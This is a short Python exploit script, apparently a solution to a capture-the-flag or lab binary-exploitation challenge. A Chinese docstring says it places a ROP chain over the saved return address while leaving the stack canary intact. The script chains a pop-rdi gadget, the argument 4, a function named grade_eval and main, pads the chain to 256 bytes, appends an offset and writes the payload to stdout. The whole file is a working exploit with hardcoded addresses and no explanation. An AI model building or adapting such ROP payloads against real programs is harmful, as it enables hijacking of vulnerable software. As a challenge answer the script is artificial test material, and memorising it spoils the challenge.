#!/usr/bin/env python3
"""不改动 Canary，将 ROP 链复制到保存的返回地址处。"""
import struct
import sys

pack = struct.pack
pop_rdi = 0x4018A3
grade_eval = 0x401677
main = 0x4017F5
chain = pack("<Q", pop_rdi) + pack("<Q", 4)
chain += pack("<Q", grade_eval) + pack("<Q", main)
payload = chain.ljust(256, b"A") + pack("<i", 168)

sys.stdout.buffer.write(payload)
